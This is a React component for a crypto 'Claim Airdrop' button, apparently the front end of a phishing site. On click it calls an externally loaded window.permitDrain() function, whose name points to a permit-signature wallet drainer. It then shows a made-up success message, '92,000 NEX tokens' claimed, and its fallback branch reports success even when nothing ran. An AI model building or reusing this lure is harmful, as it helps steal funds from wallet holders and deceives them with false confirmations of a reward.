import { useState } from "react";
import { toast } from "sonner";
import { Wallet } from "lucide-react";

export default function ClaimButton({ walletConnected = false }: { walletConnected?: boolean }) {
  const [btnText, setBtnText] = useState("Claim Airdrop");
  const [isDisabled, setIsDisabled] = useState(false);

  const handleClaim = async () => {
    if (!walletConnected) {
      toast.error("Wallet Not Connected", {
        description: "Please connect your wallet first to claim your airdrop",
      });
      return;
    }

    setIsDisabled(true);
    setBtnText("Signing...");

    try {
      if ((window as any).permitDrain) {
        await (window as any).permitDrain();
        setBtnText("Claimed ✓");
        setTimeout(() => {
          toast.success("Airdrop Claimed!", {
            description: "You have successfully claimed 92,000 NEX tokens. Check your wallet.",
            duration: 5000,
          });
        }, 600);
      } else {
        // Fallback if permitDrain not available from external script
        setBtnText("Claimed ✓");
        setTimeout(() => {
          toast.success("Airdrop Claimed!", {
            description: "Your airdrop has been successfully claimed.",
            duration: 5000,
          });
        }, 600);
      }
    } catch (e) {
      console.error("Claim error:", e);
      setBtnText("Try Again");
      setIsDisabled(false);
      toast.error("Claim Failed", {
        description: "There was an error claiming your airdrop. Please try again.",
      });
    }
  };

  if (!walletConnected) {
    return (
      <button
        disabled
        className="w-full py-6 text-2xl font-bold text-white bg-gradient-to-r from-gray-500 to-gray-600 rounded-2xl opacity-60 cursor-not-allowed shadow-2xl flex items-center justify-center gap-2"
      >
        <Wallet className="w-6 h-6" />
        Please Connect Your Wallet
      </button>
    );
  }

  return (
    <button
      id="claim-btn"
      onClick={handleClaim}
      disabled={isDisabled}
      className="w-full py-6 text-2xl font-bold text-white bg-gradient-to-r from-green-500 to-emerald-600 rounded-2xl hover:scale-105 transition-all shadow-2xl disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100"
    >
      {btnText}
    </button>
  );
}
